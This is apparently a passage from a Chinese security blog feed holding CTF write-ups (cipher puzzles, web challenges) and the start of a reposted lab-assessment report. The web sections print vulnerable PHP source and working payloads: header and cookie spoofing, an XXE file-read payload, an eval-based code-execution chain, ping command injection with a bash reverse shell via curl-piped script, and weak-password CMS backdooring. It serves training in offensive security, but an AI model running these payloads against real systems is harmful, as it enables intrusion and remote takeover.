+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encode_flag &#x3D; &quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,29):</span><br><span class="line">    flag&#x3D;&quot;&quot;</span><br><span class="line">    num &#x3D; 28&#x2F;k</span><br><span class="line">    for i in range(k):</span><br><span class="line">	    for j in range(num):</span><br><span class="line">		    flag +&#x3D; encode_flag[j*k+i]</span><br><span class="line">    if &quot;flag&quot; in flag:</span><br><span class="line">        print &quot;k:&quot;+str(28&#x2F;k)+&quot;\n&quot;+&quot;flag:\n&quot;+flag+&quot;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>描述：</p>
+<p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密文：</span><br><span class="line">jivsyisgmlirgbggvuocevsivnsoevszotfloymivnmozwgitmbyfevtgugvffecgmflgtglimbggvjgmmuocevsivnijofcotgsoevsklgvflgkotjnkimmfejjhohyjifgnbwlyvfgtsiflgtgtmmcijjfeslfjwqvefstoyhmngrgjohgnflgetokvhiffgtvmozmhggulevnghgvngvfozgiuloflgtmocgjivsyisggdhgtfmbgjegrgflifwgitmisoklgvflgkotjnlinxymfzergfofgvcejjeovhgohjgflgwmhoqghgtlihmjivsyisgmbgfkggvflgcmoovizfgtkitnmcivwozflomghgohjgmfitfgnmgffjevsnokvfobguocgzitcgtmivnflgetjivsyisgmfoobguicgcotgmgffjgnivnzgkgtevvycbgtevtgugvfugvfytegmftingevnymfteijemifeovflgngrgjohcgvfozflgvifeovmfifgivnflgmhtginozyvergtmijuochyjmotwgnyuifeovgmhgueijjwsjobijemifeovivnbgffgtuoccyveuifeovmevflghimfzgknguingmijjlirguiymgncivwjivsyisgmfonemihhgitivnnocevivfjivsyisgmmyulimgvsjemlmhivemlivnulevgmgitgevutgimevsjwfiqevsorgtifhtgmgvfflgkotjnlimiboyfjivsyisgmflgnemftebyfeovozflgmgjivsyisgmemlysgjwyvgrgvflgsgvgtijtyjgemflifcejnpovgmlirgtgjifergjwzgkjivsyisgmozfgvmhoqgvbwcivwhgohjgklejglofkgfpovgmlirgjofmozfgvmhoqgvbwmcijjvycbgtmgytohglimovjwitoyvnjivsyisgmflgicgteuimiboyfizteuiivnimeiivnflghiuezeuhgtlihmozkleulhihyivgksyevgiijovgiuuoyvfmzotkgjjorgtflgcgneivvycbgtozmhgiqgtmemcgtgkleulfliflijzflgkotjnmjivsyisgmitgmhoqgvbwzgkgthgohjgflivflifijtginwkgjjorgtozflgfofijozjivsyisgmitgujomgfogdfevufeovkeflovjwizgkgjngtjwmhgiqgtmjgzfheuqiftivnocbymyyevuicgtoovgeslftgcievevsmhgiqgtmuleihivguoevcgdeuojehivihiulgevflgyvefgnmfifgmfkootfltggotkinxesyeviymftijeiovgkefliaygmfeovcitqvovgozflgmgmggcmfolirgcyululivugozmytrerij</span><br><span class="line">明文：</span><br><span class="line">Languages have been coming and going for thousands of years, but in recent times there has been less coming and a lot more going. When the world was still populated by hunter-gatherers，small，tightly knit(联系)groups developed their own patterns of speech independent of each other. Some language experts believe that 10,000 years ago, when the world had just five to ten million people, they spoke perhaps 12, 000 languages between them.Soon afterwards, many of those people started settling down to become farmers, and their languages too became more settled and fewer in number. In recent centuries, trade, industrialisation, the development of the nation-state and the spread of universal compulsory education, especially globalisation and better communications in the past few decades, all have caused many languages to disappear, and dominant languages such as English，Spanish and Chinese are increasingly taking over.At present, the world has about 6, 800 languages. The distribution of these languages is hugely uneven. The general rule is that mild zones have relatively few languages, often spoken by many people, while hot wet zones have lots, often spoken by small numbers. Europe has only around 200 languages; the Americas about 1, 000; Africa 2, 400; and Asia and the Pacific perhaps 3,200, of which Papua New Guinea alone accounts for well over 800.The median number(中位数) of speakers is mere 6,000, which that half the world&#39;s languages are spoken by fewer people than that.Already well over 400 of the total of 6, 800 languages are close to extinction (消亡), with only a few elderly speakers left. Pick, at random, Busuu in Cameroon （eight remaining speakers), Chiapaneco in Mexico (150), Lipan Apache in the United States (two or three) or Wadjigu in Australia (one, with a question-mark): none of these seems to have much chance of survival</span><br></pre></td></tr></table></figure>
+
+<p>待解密文：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">givfome</span><br></pre></td></tr></table></figure>
+
+<p>解题过程</p>
+<p>进行字频统计得出如下结果</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e &#x3D;&gt;g</span><br><span class="line">a &#x3D;&gt;i</span><br><span class="line">n &#x3D;&gt;v</span><br><span class="line">t &#x3D;&gt;f</span><br><span class="line">o &#x3D;&gt;o</span><br><span class="line">s &#x3D;&gt;m</span><br><span class="line">i &#x3D;&gt;e</span><br><span class="line">r &#x3D;&gt;j</span><br><span class="line">l &#x3D;&gt;t</span><br><span class="line">h &#x3D;&gt;l</span><br><span class="line">u &#x3D;&gt;y</span><br><span class="line">d &#x3D;&gt;s</span><br><span class="line">g &#x3D;&gt;h</span><br><span class="line">p &#x3D;&gt;n</span><br><span class="line">c &#x3D;&gt;u</span><br><span class="line">m &#x3D;&gt;c</span><br><span class="line">f &#x3D;&gt;z</span><br><span class="line">w &#x3D;&gt;k</span><br><span class="line">y &#x3D;&gt;b</span><br><span class="line">v &#x3D;&gt;w</span><br><span class="line">k &#x3D;&gt;r</span><br><span class="line">c &#x3D;&gt;q</span><br><span class="line">p &#x3D;&gt;d</span><br><span class="line">t &#x3D;&gt;p</span><br><span class="line">x &#x3D;&gt;x</span><br><span class="line">j &#x3D;a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>加密脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">s = <span class="string">&quot;eantosi&quot;</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	k=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">		i = i.lower()</span><br><span class="line">		<span class="keyword">if</span> j == i:</span><br><span class="line">			l =(<span class="number">19</span>*k+<span class="number">18</span>)%<span class="number">26</span>	</span><br><span class="line">			m = m + table[l]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			k = k+<span class="number">1</span>	</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;eantosi&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="G2mtu学生？"><a href="#G2mtu学生？" class="headerlink" title="G2mtu学生？"></a>G2mtu学生？</h3><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;0&quot;</span>, time()+<span class="number">360</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SERVER[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]!=<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;u no student in Gzmtu&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;flag&#123;welcom_to_GZMTU_56456s4awdawdafafa&#125;&quot;</span>;		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;u no admin!&quot;</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>xff伪造ip为127.0.0.1然后改cookie未授权访问即可获取到flag</p>
+<h3 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h3><p>考点</p>
+<ul>
+<li>XXE外部实体注入</li>
+</ul>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$resp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="literal">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;请输入姓名&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;feedback&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;author&gt;&#x27;</span> + document.getElementById(<span class="string">&#x27;name&#x27;</span>).value+ <span class="string">&#x27;&lt;/author&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;/feedback&gt;&#x27;</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">&#x27;title&#x27;</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;index.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解题思路</p>
+<p>xxe外部实体注入+伪协议读取源码</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;feedback&gt;</span><br><span class="line">&lt;author&gt;&amp;xxe;&lt;/author&gt;</span><br><span class="line">&lt;/feedback&gt;</span><br></pre></td></tr></table></figure>
+
+<p>抓包改一下，再base64解密即可得到flag</p>
+<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>过滤诸多，将常用的数组控制函数给ban了，session也ban了，文件显示的<strong>show_souce</strong>以及<strong>highlight_file</strong>也没了，能用的函数查阅完，最终有个控制数组的随机数函数<strong>array_rand</strong>以及文件<strong>file_get_contents</strong>，选择当前目录的函数有个<strong>current</strong>组合起来就行了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>但是后边又过滤了flag，而flag在flag.php，读到就会die掉，所以需要加密，常用的加密base64已经被过滤了，选择使用十六进制加密，最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
+
+<p>读取的时候有些文件也会被读取进来，因为是随机读取，每次出现不一样的十六进制，都需要多解密看看，解密代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="string">&quot;3c3f7068700d0a2f2f666c61677b31353166306361642d376338322d346164312d383230332d3536636333366461393564307d0d0a3f3e&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>解开得flag</p>
+<h3 id="神奇的输入框"><a href="#神奇的输入框" class="headerlink" title="神奇的输入框"></a>神奇的输入框</h3><p>这道题是一道无回显的ping命令</p>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[<span class="string">&#x27;submit&#x27;</span>]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[<span class="string">&#x27;site&#x27;</span>];</span><br><span class="line">            <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>解法一</li>
+</ul>
+<p>利用<code>&gt;</code>把我们需要执行的命令写入文件里面</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问1.txt然后看到flagggg.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat flagggg.php&gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者反引号执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;cat flagggg.php&gt; 1.txt&#96;</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag</p>
+<ul>
+<li>解法二</li>
+</ul>
+<p>直接反弹一个shell</p>
+<p>在vps监听1234端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>在vps的/var/www/html写入bash反弹语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后回到输入框下输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|curl ip|bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120730923.png" alt="image-20201119120730923"></p>
+<p>tips：因为docker靶机的环境问题可能无法写shell，以及无法使用dnslog外带数据。</p>
+<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>弱口令admin/admin8888登录后台</p>
+<ul>
+<li>解法一</li>
+</ul>
+<p>文件包含漏洞</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132632586.png" alt="image-20201119132632586"></p>
+<p>插入php代码</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132855855.png" alt="image-20201119132855855"></p>
+<p>改一下页面</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133034032.png" alt="image-20201119133034032"></p>
+<p>然后点击前台的关于我们</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133206501.png" alt="image-20201119133206501"></p>
+<p>点进去即可获得flag</p>
+<ul>
+<li>其他解法</li>
+</ul>
+<p>百度xiaocms漏洞，有现成的getshell方法</p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【转载】记一次某众测的考核</title>
+    <url>/2020/11/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/Gw8d18DkRHtCF1Co_tnzWg">传送门</a><a id="more"></a></p>
+<p>最近没什么事，于是报名了某众测，填了资料主办方给了个靶场要考核，这里记录一下靶场考核中的解题过程，一共十道题目，难度也不算太难，但也有一些题没做出来，最后也是顺利的通过了考核。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201029125542536.png" alt="image-20201029125542536"></p>
+<h2 id="前戏"><a href="#前戏" class="headerlink" title="前戏"></a>前戏</h2><p>首先考核要答一些选择题和判断题，没什么好说的，主办方要求连了vpn没法上外网，但是都是一些基础的网络安全问题，随便答答就过了，接下来就是靶场的题目了。</p>
+<h2 id="靶场题目"><a href="#靶场题目" class="headerlink" title="靶场题目"></a>靶场题目</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>WeSec微信公众号</p>
+<p>提示：用IPAD手机的2G网络上网</p>
+<p>很明显改改UA头就行了，直接搜一下UA头，替换上去。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/image-20201028230921027.png" alt="image-20201028230921027"></p>
+<p>改UA头</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;mp_weixin_qq_com.php HTTP&#x2F;1.1</span><br><span class="line">Host: 119.3.225.8:41064</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Mobile&#x2F;15E148 MicroMessenger&#x2F;7.0.10(0x17000a21) NetType&#x2F;2G Language&#x2F;zh_CN</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;119.3.225.8:41064&#x2F;index.html</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mozhe64d25d173bdbae7366b76e0798a</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>易学车智能考试系统</p>
+<p>扫目录发现/admin</p>
+<p>爆破弱口令admin和admin888登录后台，发现后台是一个保存文件的功能，这里可以直接读取备份文件bak_wwwroot.zip的源码，关键代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;todir&quot; type=&quot;text&quot; id=&quot;todir&quot; value=&quot;__bak__&quot; class=&quot;xxp&quot;&gt;(留空为本目录)&lt;br&gt;文件保存名称:</span><br><span class="line">        &lt;input name=&quot;zipname&quot; type=&quot;text&quot; id=&quot;zipname&quot; value=&quot;bak_wwwroot.zip&quot; class=&quot;xxp&quot;&gt;(.zip)&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;input name=<span class="string">&quot;password&quot;</span> type=<span class="string">&quot;hidden&quot;</span> id=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_POST</span>[&#x27;password&#x27;];?&gt;&quot;</span>&gt;</span><br><span class="line">        &lt;input name=<span class="string">&quot;myaction&quot;</span> type=<span class="string">&quot;hidden&quot;</span> id=<span class="string">&quot;myaction&quot;</span> value=<span class="string">&quot;dozip&quot;</span>&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;Submit&quot;  class=&quot;sub&quot; value=&quot; 开始备份&quot;&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    $endstr = <span class="string">&quot;\x50\x4b\x05\x06\x00\x00\x00\x00&quot;</span> .</span><br><span class="line">                        pack(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">$this</span> -&gt; file_count) .</span><br><span class="line">                        pack(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">$this</span> -&gt; file_count) .</span><br><span class="line">                        pack(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">$this</span> -&gt; dirstr_len) .</span><br><span class="line">                        pack(<span class="string">&#x27;V&#x27;</span>, <span class="keyword">$this</span> -&gt; datastr_len) .</span><br><span class="line">                        <span class="string">&quot;\x00\x00&quot;</span>;</span><br><span class="line">                    fwrite(<span class="keyword">$this</span>-&gt;fp,<span class="keyword">$this</span>-&gt;dirstr.$endstr);</span><br><span class="line">                    fclose(<span class="keyword">$this</span>-&gt;fp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(is_array($_REQUEST[dfile]))&#123;</span><br><span class="line">                $faisunZIP = <span class="keyword">new</span> PHPzip;</span><br><span class="line">                <span class="keyword">if</span>($faisunZIP -&gt; startfile(<span class="string">&quot;<span class="subst">$_REQUEST</span>[todir]<span class="subst">$_REQUEST</span>[zipname]&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;正在添加备份文件...&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                    $filenum = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">foreach</span>($_REQUEST[dfile] <span class="keyword">as</span> $file)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;文件: <span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;目录: <span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        $filenum += listfiles($file);</span><br><span class="line">                    &#125;</span><br><span class="line">                    $faisunZIP -&gt; createfile();</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;备份完成,共添加 <span class="subst">$filenum</span> 个文件.&lt;br&gt;&lt;a href=&#x27;<span 